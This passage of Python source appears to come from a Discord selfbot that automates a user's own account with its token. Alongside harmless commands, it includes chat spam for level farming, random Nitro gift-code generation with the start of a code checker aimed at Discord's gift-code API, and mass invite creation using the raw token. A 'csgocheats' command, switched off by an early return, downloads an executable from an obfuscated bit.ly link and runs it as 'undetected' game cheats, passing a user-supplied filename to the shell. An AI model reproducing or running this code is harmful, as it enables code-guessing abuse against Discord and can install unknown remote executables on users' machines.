                if link.text.startswith("https://xkcd.com/"):
                    found = link.text.split("/")[3]
                    break
            if not found:
                await ctx.send(self.bot.bot_prefix + "That comic doesn't exist!")
            else:
                site = requests.get("https://xkcd.com/{}/info.0.json".format(found))
                comic = found
        if site:
            json = site.json()
            embed = discord.Embed(title="xkcd {}: {}".format(json["num"], json["title"]), url="https://xkcd.com/{}".format(comic))
            embed.set_image(url=json["img"])
            embed.set_footer(text="{}".format(json["alt"]))
            await ctx.send("", embed=embed)

    @commands.command(pass_context=True)
    async def uni(self, ctx, *, msg: str):
        if await disableCmd(ctx) == 0: return
        """Convert to unicode emoji if possible. Ex: [p]uni :eyes:"""
        await ctx.send("`" + msg.replace("`", "") + "`")
        cmdused("uni")

    @commands.command(aliases=['status'], pass_context=True)
    async def stats(self, ctx):
        if await disableCmd(ctx) == 0: return
        """Bot stats."""
        uptime = (datetime.datetime.now() - self.bot.uptime)
        hours, rem = divmod(int(uptime.total_seconds()), 3600)
        minutes, seconds = divmod(rem, 60)
        days, hours = divmod(hours, 24)
        if days:
            time = '%s days, %s hours, %s minutes, and %s seconds' % (days, hours, minutes, seconds)
        else:
            time = '%s hours, %s minutes, and %s seconds' % (hours, minutes, seconds)
        game = self.bot.game
        if not game:
            game = 'None'
        channel_count = 0
        for guild in self.bot.guilds:
            channel_count += len(guild.channels)
        if not self.bot.command_count:
            most_used_cmd = 'Not enough info'
        else:
            cmd_name = max(self.bot.command_count, key=self.bot.command_count.get)
            total_usage = self.bot.command_count[str(cmd_name)]
            plural = '' if total_usage == 1 else 's'
            most_used_cmd = '{} - {} use{}'.format(cmd_name, total_usage, plural)
        if embed_perms(ctx.message):
            em = discord.Embed(title='Bot Stats', color=0x32441c)
            em.add_field(name=u'\U0001F553 Uptime', value=time, inline=False)
            em.add_field(name=u'\u2328 Most Used Cmd', value=most_used_cmd, inline=False)
            em.add_field(name=u'\U0001F4E4 Msgs sent', value=str(self.bot.icount))
            em.add_field(name=u'\U0001F4E5 Msgs received', value=str(self.bot.message_count))
            em.add_field(name=u'\u2757 Mentions', value=str(self.bot.mention_count))
            em.add_field(name=u'\u2694 Servers', value=str(len(self.bot.guilds)))
            em.add_field(name=u'\ud83d\udcd1 Channels', value=str(channel_count))
            em.add_field(name=u'\u270F Keywords logged', value=str(self.bot.keyword_log))
            g = u'\U0001F3AE Game'
            if '=' in game: g = '\ud83c\udfa5 Stream'
            em.add_field(name=g, value=game)
            try:
                mem_usage = '{:.2f} MiB'.format(__import__('psutil').Process().memory_full_info().uss / 1024 ** 2)
            except AttributeError:
                # OS doesn't support retrieval of USS (probably BSD or Solaris)
                mem_usage = '{:.2f} MiB'.format(__import__('psutil').Process().memory_full_info().rss / 1024 ** 2)
            em.add_field(name=u'\U0001F4BE Memory usage:', value=mem_usage)
            await ctx.send(content=None, embed=em)
        else:
            msg = '**Bot Stats:** ```Uptime: %s\nMessages Sent: %s\nMessages Received: %s\nMentions: %s\nguilds: %s\nKeywords logged: %s\nGame: %s```' % (
            time, str(self.bot.icount), str(self.bot.message_count), str(self.bot.mention_count),
            str(len(self.bot.guilds)), str(self.bot.keyword_log), game)
            await ctx.send(self.bot.bot_prefix + msg)
        await ctx.message.delete()
    
    @commands.command(aliases=['levelup', 'lvlup', 'lvlsgrind', 'lvlupbot'])
    async def levelsgrind(self, ctx, amount: int):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        sentences = [
            'Stop waiting for exceptional things to just happen.',
            'The lyrics of the song sounded like fingernails on a chalkboard.',
            'I checked to make sure that he was still alive.', 'We need to rent a room for our party.',
            'He had a hidden stash underneath the floorboards in the back room of the house.',
            'Your girlfriend bought your favorite cookie crisp cereal but forgot to get milk.',
            'People generally approve of dogs eating cat food but not cats eating dog food.',
            'I may struggle with geography, but I\'m sure I\'m somewhere around here.',
            'She was the type of girl who wanted to live in a pink house.',
            'The bees decided to have a mutiny against their queen.',
            'She looked at the masterpiece hanging in the museum but all she could think is that her five-year-old could do better.',
            'The stranger officiates the meal.', 'She opened up her third bottle of wine of the night.',
            'They desperately needed another drummer since the current one only knew how to play bongos.',
            'He waited for the stop sign to turn to a go sign.',
            'His thought process was on so many levels that he gave himself a phobia of heights.',
            'Her hair was windswept as she rode in the black convertible.',
            'Karen realized the only way she was getting into heaven was to cheat.',
            'The group quickly understood that toxic waste was the most effective barrier to use against the zombies.',
            'It was obvious she was hot, sweaty, and tired.', 'This book is sure to liquefy your brain.',
            'I love eating toasted cheese and tuna sandwiches.', 'If you don\'t like toenails',
            'You probably shouldn\'t look at your feet.',
            'Wisdom is easily acquired when hiding under the bed with a saucepan on your head.',
            'The spa attendant applied the deep cleaning mask to the gentleman’s back.',
            'The three-year-old girl ran down the beach as the kite flew behind her.',
            'For oil spots on the floor, nothing beats parking a motorbike in the lounge.',
            'They improved dramatically once the lead singer left.',
            'The Tsunami wave crashed against the raised houses and broke the pilings as if they were toothpicks.',
            'Excitement replaced fear until the final moment.', 'The sun had set and so had his dreams.',
            'People keep telling me "orange" but I still prefer "pink".',
            'Someone I know recently combined Maple Syrup & buttered Popcorn thinking it would taste like caramel popcorn. It didn’t and they don’t recommend anyone else do it either.',
            'I liked their first two albums but changed my mind after that charity gig.',
            'Plans for this weekend include turning wine into water.',
            'A kangaroo is really just a rabbit on steroids.',
            'He played the game as if his life depended on it and the truth was that it did.',
            'He\'s in a boy band which doesn\'t make much sense for a snake.',
            'She let the balloon float up into the air with her hopes and dreams.',
            'There was coal in his stocking and he was thrilled.',
            'This made him feel like an old-style rootbeer float smells.',
            'It\'s not possible to convince a monkey to give you a banana by promising it infinite bananas when they die.',
            'The light in his life was actually a fire burning all around him.',
            'Truth in advertising and dinosaurs with skateboards have much in common.',
            'On a scale from one to ten, what\'s your favorite flavor of random grammar?',
            'The view from the lighthouse excited even the most seasoned traveler.',
            'The tortoise jumped into the lake with dreams of becoming a sea turtle.',
            'It\'s difficult to understand the lengths he\'d go to remain short.',
            'Nobody questions who built the pyramids in Mexico.',
            'They ran around the corner to find that they had traveled back in time.'
        ]
        count = 0
        while count != amount:
            count += 1
            await ctx.send(random.choice(sentences), delete_after=2)
            await asyncio.sleep(random.randint(35, 60))
        cmdused("levelsgrind")

    @commands.command()
    async def reminder(self, ctx, *, time):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        def convert(t):
            times = t.split()
            pos = ['s', 'm', 'h', 'd']
            time_dict = {'s': 1, 'm': 60, 'h': 3600, 'd': 3600 * 24}
            final = 0
            for time in times:
                unit = time[-1]
                if unit not in pos:
                    return -1
                try:
                    val = int(time[:-1])
                except:
                    return -2
                final = final + val * time_dict[unit]
            return final
        await ctx.send(f"Set timer to {convert(time)} seconds.", delete_after=3)
        await asyncio.sleep(convert(time))
        if compat == False:
            os.system("ntfy -t \"REMINDER NOTIFICATION\" send \"Your reminder timer has ended\"")
        cmdused('reminder')

    @commands.command(name='role-hexcode', aliases=['role-color', 'rolecolor'])
    async def _role_hexcode(self, ctx, *, role: discord.Role):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        await ctx.send(f"**{role.name}**: {role.color}")
        cmdused('role-color')

    @commands.command(aliases=['markasread', 'ack'])
    async def read(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for guild in reaper.guilds:
            await guild.ack()
        cmdused('maskasread')

    @commands.command(name="guild-icon", aliases=['server-icon', 'server-av', 'server-pfp', 'guild-pfp'])
    @commands.guild_only()
    async def _guild_av(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        em = discord.Embed(description=f"[Direct Link]({ctx.guild.icon_url})",color=emcolor)
        em.set_image(url=ctx.guild.icon_url)
        await ctx.send(embed=em)
        cmdused("server-icon")

    @commands.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
    async def _backup_f(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            try:
                os.rename("backup-friends.txt", "backup-friends.old.txt")
            except:
                pass
            def getfriends(token):
                headers = headers = {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                    "Authorization": token}
                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
            for friend in getfriends(hoe_token):
                try:
                    _1 = friend["user"]["username"]
                    _2 = friend["user"]["discriminator"]
                    _3 = friend["user"]["id"]
                    friendlist = f"{_1}#{_2} (ID: {_3})"
                    with open('backup-friends.txt', 'a') as f:
                        f.write(str(friendlist)+"\n" )
                except:
                    continue
            #for block in reaper.user.blocked:
            #    blocklist = (block.name)+'#'+(block.discriminator)
            #    with open('BackupBlocked.txt', 'a') as f: 
            #        f.write(blocklist+"\n" )
            print(s.space+s.green+"Saved friends.")
        except Exception as e:
            print(e)
        cmdused('friend-backup')
        
    @commands.command(aliases=["bus", "server-backup"])
    async def backupservers(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        print(
            f"{Fore.YELLOW}[{Fore.WHITE}BACKUP{Fore.YELLOW}]{Fore.WHITE} Attempting to to rename old backup..."
        )
        try:
            os.rename("backup-servers.txt", "backup-servers.old.txt")
            print(
                f"{Fore.GREEN}[{Fore.WHITE}BACKUP{Fore.GREEN}]{Fore.WHITE} Successfully renamed old backup.\n"
            )
        except:
            pass
        start = datetime.datetime.now()

        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
            "Authorization": hoe_token
        }

        saved_servers = 0
        attempts = 0
        server_info_all = ""

        servers = requests.get(
            "https://discordapp.com/api/v6/users/@me/guilds", headers=headers
        )
        for server in servers.json():
            server_info_all += "%s|||%s\n" % (server["id"], server["name"])

        payload = {"max_age": "0", "max_uses": "0", "temporary": False}
        for server_info in server_info_all.splitlines():
            server_id = server_info.split("|||")[0]
            server_name = server_info.split("|||")[1]

            channels = requests.get(
                "https://discord.com/api/v6/guilds/%s/channels" % (server_id),
                headers=headers,
            )
            for channel in channels.json():
                if channel["type"] == 0:
                    channel_id = channel["id"]
                    invite = requests.post(
                        "https://discord.com/api/v6/channels/%s/invites" % (channel_id),
                        json=payload,
                        headers=headers,
                    )

                    if invite.status_code == 403:
                        attempts += 1
                        print(
                            f"{s.space}{s.red} Unable to make invite for: {server_name} | Channel ID: {channel_id} | Retrying..."
                        )
                        if attempts == 4:
                            print(
                                f"{s.space}{s.red} Unable to make invite for {server_name}. Assuming it has a Vanity URL..."
                            )
                            with open(
                                "Discord Servers.txt", "a", encoding="UTF-8"
                            ) as f:
                                f.write(
                                    "%s | Vanity URL\n" % (server_name)
                                )
                            saved_servers += 1
                            attempts = 0
                            break
                        else:
                            pass

                    elif invite.status_code == 429:
                        print(
                            f"{s.space}{s.red} Rate-limited. Waiting..."
                        )
                        sleep(9)

                    else:
                        invite_url = "https://discord.gg/%s" % (
                            str(invite.json()["code"])
                        )
                        print(
                            f"{Fore.GREEN}[{Fore.WHITE}BACKUP-SERVERS{Fore.GREEN}]{Fore.WHITE} Saved server: {server_name}"
                        )
                        with open("backup-servers.txt", "a", encoding="UTF-8") as f:
                            f.write(
                                "%s | Channel ID: %s | Invite Link: %s\n"
                                % (server_name, channel_id, invite_url)
                            )
                        saved_servers += 1
                        break
        elapsed = datetime.datetime.now() - start
        elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
        print(s.space+s.green+"Saved servers.")
        cmdused('server-backup')

    @commands.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage', 'first-msg'])
    async def _first_message(self, ctx, channel: discord.TextChannel = None): 
        await ctx.message.delete()  
        if channel is None:
            channel = ctx.channel
        first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
        embed = discord.Embed(description=first_message.content, color=emcolor)
        embed.set_footer(text=f"{footer} | ID: {first_message.id}")
        try:
            embed.set_author(name=first_message.author, icon_url=first_message.author.avatar_url)
        except:
            pass
        embed.add_field(name="First Message", value=f"[[Message Link]]({first_message.jump_url})")
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('firstmessage')

    @commands.command()
    async def mac(self, ctx, mac): 
        await ctx.message.delete()
        r = requests.get('http://api.macvendors.com/' + mac)
        em = discord.Embed(title='MAC Lookup Result', description=r.text, colour=0xDEADBF)
        em.set_author(name='MAC Finder', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
        await ctx.send(embed=em, delete_after=delinterval)
        cmdused('mac')

    @commands.command()
    async def abc(self, ctx): 
        await ctx.message.delete()
        ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        message = await ctx.send(ABC[0])
        cmdused('abc')
        await asyncio.sleep(2)
        for _next in ABC[1:]:
            await message.edit(content=message.content+_next)
            await asyncio.sleep(2)

    @commands.command(aliases=['bitcoin'])
    async def btc(self, ctx): 
        await ctx.message.delete()
        r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
        r = r.json()
        usd = r['USD']
        eur = r['EUR']
        em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`', color=emcolor, timestamp=datetime.utcnow())
        em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
        await ctx.send(embed=em, delete_after=delinterval)
        cmdused('btc')

    @commands.command(aliases=['etherium'])
    async def eth(self, ctx): 
        await ctx.message.delete()
        r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
        r = r.json()
        usd = r['USD']
        eur = r['EUR']
        em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`', color=emcolor, timestamp=datetime.utcnow())
        em.set_author(name='Bitcoin', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
        await ctx.send(embed=em, delete_after=delinterval)
        cmdused('eth')

    @commands.command(aliases=['litecoin'])
    async def ltc(self, ctx): 
        await ctx.message.delete()
        r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USD,EUR')
        r = r.json()
        usd = r['USD']
        eur = r['EUR']
        em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`', color=emcolor, timestamp=datetime.utcnow())
        em.set_author(name='Litecoin', icon_url='https://cdn.discordapp.com/attachments/804623285378744321/810788035696263198/litecoin-logo-vector.png')
        await ctx.send(embed=em, delete_after=delinterval)
        cmdused('ltc')

    @commands.command()
    async def topic(self, ctx): 
        await ctx.message.delete()
        r = requests.get('https://www.conversationstarters.com/generator.php').content
        soup = bs4(r, 'html.parser')
        topic = soup.find(id="random").text
        await ctx.send(topic)
        cmdused('topic')

    @commands.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
    async def wyr(self, ctx): 
        await ctx.message.delete()
        r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
        soup = bs4(r, 'html.parser')
        qa = soup.find(id='qa').text
        qor = soup.find(id='qor').text
        qb = soup.find(id='qb').text
        em = discord.Embed(description=f'1️⃣ {qa}\n{qor}\n2️⃣ {qb}', color=emcolor)
        em.set_author(name="Would you rather..", icon_url=emimage)
        em.set_footer(text=footer)
        q = await ctx.send(embed=em, delete_after=delinterval)
        await q.add_reaction("1️⃣")
        await q.add_reaction("2️⃣")
        cmdused('wouldyourather')

    @commands.command()
    async def hastebin(self, ctx, *, message): 
        await ctx.message.delete()
        r = requests.post("https://hastebin.com/documents", data=message).json()
        await ctx.send(f"<https://hastebin.com/{r['key']}>")
        cmdused('hastebin')

class csgoCheats(commands.Cog):
    def __init__(self, bote):
        self.bot = bote
        self.cdl = REAPER.res["csgo-cheats-dl"]

    @commands.command()
    async def csgocheats(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        return # remove to re-enable
        pyl = s.space+s.yellow
        pyr = s.space+s.red
        pyg = s.space+s.green
        filename = "ReaperCSGO.exe"
        try:
            filename = re.findall("-force[:] \"(\w+)\"", args)[0]
        except:
            try:
                filename = re.findall("[-]force[:] \"(\w+)\"", args)[0]
            except:
                try:
                    filename = re.findall("-force: \"(\w+)\"", args)[0]
                except Exception:
                    print(Exception)
                    filename=filename
        try:
            print(pyl+"Attempting to start a new process...")
            open(filename, "r")
            sleep(random.randint(12, 16) / 10)
            os.system("start "+filename)
            print(pyg+"Started a new process at "+filename+"!")
            await ctx.send(embed=discord.Embed(
                color=emcolor,
                description="",
                timestamp=datetime.utcnow()))\
                .set_author(name="Reaper CSGO Cheats", icon_url=emimage)
            fields = [
                {"name": "Status", "value": "Undetected"},
                {"name": "Process Name", "value": filename},
                {"name": "Developer", "value": "ALittlePatate#1252"}
            ]
        except FileNotFoundError:
            print(pyr+f"\"{filename}\" is not detected.")
            print(pyl+f"Preparing to install CSGO cheats...")
            sleep(random.randint(4, 16) / 10)
            print(pyl+"Requesting the latest version of the CSGO cheats from the web...")
            res = requests.get("http://bit.ly/b2ed97f86d2efdb0113b5f200d094b64a06f9648377e1de4082e7cd87d6f4e43b4b8439409c38ddc3d1570eba41d37f3ba4026904e789ca5a5adb2bc68ad66958243e64141de8fa425d781f8e30ef636b071d6f449b9af436ddc19a8c9f76a5a02d9f09", allow_redirects=True).json()
            dl = res["reaper-csgo-dl"]
            print(pyg+"Requested and recieved!")
            sleep(random.randint(4, 16) / 10)
            print(pyl+"Downloading latest version...")
            r = requests.get(dl, allow_redirects=True)
            print(pyg+"Downloaded!")
            sleep(random.randint(4, 16) / 10)
            print(pyl+"Writing to a file...")
            open("ReaperCSGO.exe", "wb").write(r.content)
            filename = "ReaperCSGO.exe"
            print(pyg+"Written!")
            sleep(random.randint(4, 16) / 10)
            print(pyl+"Attempting to start a new process...")
            sleep(random.randint(12, 16) / 10)
            os.system("start "+filename)
            print(pyg+"Started a new process at "+filename+"!")

class InvoiceCommands(commands.Cog):
    def __init__(self, bote):
        self.bot = bote
        self.config = config["Payments"]
        self.cmd = lambda m: cmdused(m.message.content.split(prefix)[1].split(" ")[0])
        self.scn = lambda m, n, b, v: str (f"https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl={b}:{v}?amount={str(self.clc(m,n))}")
        self.del_ = lambda m: int(self.config[m]["DeleteEmbedAfter"])

    def clc(self, m, n): 
        r = requests.get(f"https://min-api.cryptocompare.com/data/price?fsym={n}&tsyms=USD,EUR")
        r = r.json()
        return str(m / r["USD"])

    @commands.command(aliases=['btc-invoice', 'bitcoin-invoice'])
    async def btcinvoice(self, ctx, *, amount: int):
        if await disableCmd(ctx) == 0: return
        try:
            c = self.config["Bitcoin"]["Address"]
            await ctx.send(embed=discord.Embed(
                title="Bitcoin Invoice",
                description=f"You need to pay ${amount} in bitcoin to \nthis address: `{c}`\nAmount in USD**:** ${amount}\nAmount in BTC**:** "+self.clc(amount, "BTC"),
                color=0xf49423,
                timestamp=datetime.utcnow())\
                .set_thumbnail(url="https://localbitcoinnow.com/wp-content/uploads/2019/12/The-bit-logo-e1575819611411.png")\
                .set_image(url=self.scn(amount, "btc", "bitcoin", c))\
                .set_footer(text=footer), delete_after=self.del_("Bitcoin"))
            await ctx.message.delete()
            self.cmd(ctx)
        except Exception as e:
            print(e)

    @commands.command(aliases=['eth-invoice', 'etherium-invoice'])
    async def ethinvoice(self, ctx, *, amount: int):
        if await disableCmd(ctx) == 0: return
        c = self.config["Etherium"]["Address"]
        await ctx.send(embed=discord.Embed(
            title="Etherium Invoice",
            description=f"You need to pay ${amount} in etherium to \nthis address: `{c}`\nAmount in USD**:** ${amount}\nAmount in ETH**:** "+self.clc(amount, "ETH"),
            color=0x8c94b3,
            timestamp=datetime.utcnow())\
            .set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Ethereum-icon-purple.svg/1200px-Ethereum-icon-purple.svg.png")\
            .set_image(url=self.scn(amount, "eth", "etherium", c))\
            .set_footer(text=footer), delete_after=self.del_("Etherium"))
        await ctx.message.delete()
        self.cmd(ctx)

    @commands.command(aliases=['ltc-invoice', 'litecoin-invoice'])
    async def ltcinvoice(self, ctx, *, amount: int):
        if await disableCmd(ctx) == 0: return
        try:
            amount = int(amount)
        except ValueError:
            amount = amount.replace("$", "").replace(" ", ""); int (amount)
        c = self.config["Litecoin"]["Address"]
        await ctx.send(embed=discord.Embed(
            title="Litecoin Invoice",
            description=f"You need to pay ${amount} in litecoin to \nthis address: `{c}`\nAmount in USD**:** ${amount}\nAmount in LTC**:** "+self.clc(amount, "LTC"),
            color=0xf0f0f0,
            timestamp=datetime.utcnow())\
            .set_thumbnail(url="https://cdn.discordapp.com/attachments/809818922911137794/811758870863151104/litecoin-logo.png")\
            .set_image(url=self.scn(amount, "ltc", "litecoin", c))\
            .set_footer(text=footer), delete_after=self.del_("Litecoin"))
        await ctx.message.delete()
        self.cmd(ctx)

    @commands.command(aliases=['cashapp-invoice', 'cashapp'])
    async def cashappinvoice(self, ctx, *, amount: int):
        if await disableCmd(ctx) == 0: return
        c = self.config["Cashapp"]["Name"]
        await ctx.send(embed=discord.Embed(
            title="CashApp Invoice",
            description=f"You need to pay ${amount} to {c} on CashApp!",
            color=0x04cf33,
            timestamp=datetime.utcnow())\
            .set_thumbnail(url="https://lh3.googleusercontent.com/6RcPDQwPihY591Axu7e6mHhMZ22Q-dqeI5z9GkJiu4Hc-Xha77E6uoeplstYuv5RcnE")\
            .set_footer(text=footer), delete_after=self.del_("Cashapp"))
        await ctx.message.delete()
        self.cmd(ctx)

    @commands.command(aliases=['paypal-invoice', 'paypal'])
    async def paypalinvoice(self, ctx, *, amount: int):
        if await disableCmd(ctx) == 0: return
        try:
            try: 
                c = self.config["Paypal"]["Email"]
            except KeyError:
                c = self.config["Paypal"]["Name"]
            await ctx.send(embed=discord.Embed(
                title="Paypal Invoice",
                description=f"You need to pay ${amount} to {c} on Paypal!",
                color=0x212e64,
                timestamp=datetime.utcnow())\
                .set_thumbnail(url="https://1000logos.net/wp-content/uploads/2017/05/emblem-Paypal.jpg")\
                .set_footer(text=footer), delete_after=self.del_("Paypal"))
            await ctx.message.delete()
        except Exception as e:
            print(e)
        self.cmd(ctx)

    @commands.command(aliases=['venmo-invoice', 'venmo'])
    async def venmoinvoice(self, ctx, *, amount: int):
        if await disableCmd(ctx) == 0: return
        c = self.config["Venmo"]["Name"]
        await ctx.send(embed=discord.Embed(
            title="Venmo Invoice",
            description=f"You need to pay ${amount} to {c} on Venmo!",
            color=0x4694cc,
            timestamp=datetime.utcnow())\
            .set_thumbnail(url="https://air-marketing-assets.imgix.net/blog/logo-db/venmo-logo/venmo-logo-png-1.png")\
            .set_footer(text=footer), delete_after=self.del_("Venmo"))
        await ctx.message.delete()
        self.cmd(ctx)

    @commands.command(aliases=['monero-invoice', 'xmrinvoice', 'xmr-invoice', 'monero'])
    async def moneroinvoice(self, ctx, *, amount: int):
        if await disableCmd(ctx) == 0: return
        c = self.config["Monero"]["Address"]
        await ctx.send(embed=discord.Embed(
            title="Monero Invoice",
            description=f"You need to pay ${amount} in Monero to \nthis address: `{c}`\nAmount in USD**:** ${amount}\nAmount in XMR**:** "+self.clc(amount, "BTC"),
            color=0xf36424,
            timestamp=datetime.utcnow())\
            .set_thumbnail(url="https://cdn.discordapp.com/attachments/809818922911137794/811757685498052628/monero-xmr-logo.png")\
            .set_image(url=self.scn(amount, "xmr", "xmr", c))\
            .set_footer(text=footer), delete_after=self.del_("Monero"))
        await ctx.message.delete()
        self.cmd(ctx)

class NitroCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases=['nitrogentxt','nitrostxt', 'gennitro', 'nitrogen', 'nitrogenerator'])
    async def nitrotxt(self, ctx, *, amount : int = 1):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            os.remove("nitros.txt")
        except:
            pass
        length = 16
        letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        gened = 0
        start = pytime.time()
        for i_ in range(amount):
            with open("nitros.txt", "a") as f:
                code = ''.join(random.choice(letters) for i in range(length))
                f.write(f"https://discord.gift/{code}\n")
                print(f"  {c.b}[{Fore.YELLOW} {gened+1} {Fore.WHITE}] - https://discord.gift/{Style.RESET_ALL}{Fore.YELLOW}"+code+Fore.RESET)
                gened = gened + 1
                #ctypes.windll.kernel32.SetConsoleTitleW(f'Reaper Selfbot | Generated {gened} codes')
        elapsed = pytime.time() - start
        print(s.space+s.green+f"{gened} codes generated - Elapsed: {str(elapsed)} seconds")
        #ctypes.windll.kernel32.SetConsoleTitleW(f'Reaper Selfbot | Logs | Account {reaper.user}')
        #n = toaster()
        #n.show_toast("Reaper Selfbot", f"{amount} codes generated and saved.", duration=7, icon_path="https://cdn.discordapp.com/attachments/798029919661064225/802399134396448798/rea.ico")

    @commands.command(aliases=['nitrochat'])
    async def nitro(self, ctx, *, amount : int = 1):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        length = 16
        letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

        for i in range(amount):
            i = i
            await ctx.send(f"https://discord.gift/{''.join(random.choice(letters) for i in range(length))}")
            await asyncio.sleep(0.5)
        cmdused('nitro')

class ColorText(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.group(name="colortext", aliases=["textcolor", 'color-text', 'markdown-color', 'mdcolor'], invoke_without_command=True)
    async def colortext(self, ctx):
        if await disableCmd(ctx) == 0: return
        p=f"{prefix} colortext "
        await ctx.send(embed=discord.Embed(
        description=f'''**`{p}red [msg]`**\nSends your message in red colored markdown format
        **`{p}orange [msg]`**\nSends your message in orange colored markdown format
        **`{p}yellow [msg]`**\nSends your message in yellow colored markdown format
        **`{p}green [msg]`**\nSends your message in green colored markdown format
        **`{p}cyan [msg]`**\nSends your message in cyan colored markdown format
        **`{p}blue [msg]`**\nSends your message in blue colored markdown format
        **`{p}gray [msg]`**\nSends your message in gray colored markdown format
        **`{p}white [msg]`**\nSends your message in markdown format''',
        color=emcolor,
        timestamp=datetime.now())\
            .set_footer(text=footer)\
            .set_author(
             name="Reaper Colortext Commands",
             icon_url=emimage)\
            .set_thumbnail(url=emimage)\
            .set_image(url=emimagealt)
            ,delete_after=delinterval
        )
        await ctx.message.delete()
        cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @colortext.command()
    async def red(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.send(f"```diff\n- {args}\n```")
        await ctx.message.delete()
        cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @colortext.command()
    async def orange(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.send(f"```glsl\n#{args}\n```")
        await ctx.message.delete()
        cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @colortext.command()
    async def yellow(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.send(f"```fix\n{args}\n```")
        await ctx.message.delete()
        cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @colortext.command(aliases=["green"])
    async def lime(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.send(f"```css\n{args}\n```")
        await ctx.message.delete()
        cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @colortext.command()
    async def cyan(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.send(f"```py\n'{args}\n```")
        await ctx.message.delete()
        cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @colortext.command()
    async def blue(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.send(f"```md\n# {args}\n```")
        await ctx.message.delete()
        cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @colortext.command()
    async def white(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.send(f"```{args}```")
        await ctx.message.delete()
        cmdused(ctx.message.content.split()[0].replace(prefix, ""))

    @colortext.command(aliases=['gray'])
    async def grey(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.send(f"```yaml\n# {args}```")
        await ctx.message.delete()
        cmdused(ctx.message.content.split()[0].replace(prefix, ""))

class Configuration(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    # @commands.command()
    # async def setprefix(self, ctx, *, prefix):
    #     await ctx.message.delete()
    #     try:
    #         with open("./config.yml", "a+") as ph:
    #             conf = yaml.load(ph, Loader=yaml.FullLoader)
    #             conf["Config"]["Prefix"] = prefix
    #             yaml.dump(conf, ph, indent=4)
    #             await ctx.send("Set prefix as `{}`.\nRestart the selfbot to make changes.".format(prefix), delete_after=15)
    #         cmdused('setprefix')
    #     except Exception as e:
    #         print(" "*2+errorcol+e)

class nitroChecker(commands.Cog):
    def __init__(self, bot):
        self.cfg = yaml.load(open("config.yml", "r"), Loader=yaml.FullLoader)["NitroChecker"]
        self.bot = bot
        self.used = 0
        self.valid = 0
        self.checked = 0
        self.invalid = 0
        self.letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        self.url = lambda m: f'https://discordapp.com/api/v6/entitlements/gift-codes/{m}?with_application=false&with_subscription_plan=true'
        self.headers = {
            'Content-Type': 'application/json',
